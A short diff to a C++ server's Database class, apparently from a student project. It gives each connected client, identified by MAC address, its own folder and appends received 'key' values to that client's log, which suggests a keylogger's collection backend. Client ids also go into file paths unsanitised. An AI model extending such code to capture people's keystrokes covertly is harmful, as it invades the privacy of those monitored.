@@ -5,7 +5,7 @@
 // Login   <galibe_s@epitech.net>
 //
 // Started on  Wed Aug 17 15:01:01 2016 stephane galibert
-// Last update Wed Oct 26 14:50:08 2016 stephane galibert
+// Last update Tue Nov  8 21:53:22 2016 stephane galibert
 //
 
 #include "Database.hpp"
@@ -54,6 +54,7 @@ void Database::newConnection(CRString id)
     _sql.insert(_tableName, "mac", id);
     _sql.update(_tableName, "filename", id + ".log", "mac", id);
   }
+  StaticTools::CreateFolder("./clients/" + id);
   _sql.update(_tableName, "is_connected", "1", "mac", id);
   _sql.update(_tableName, "last_connection", StaticTools::GetDate(), "mac", id);
 }
@@ -66,7 +67,7 @@ void Database::lostConnection(CRString id)
 
 void Database::newKey(CRString id, CRString key)
 {
-  std::ofstream ofs("./clients/" + id + ".log", std::ios::app | std::ios::out);
+  std::ofstream ofs("./clients/" + id + "/" + id + ".log", std::ios::app | std::ios::out);
 
   if (ofs) {
     ofs << key << std::flush;
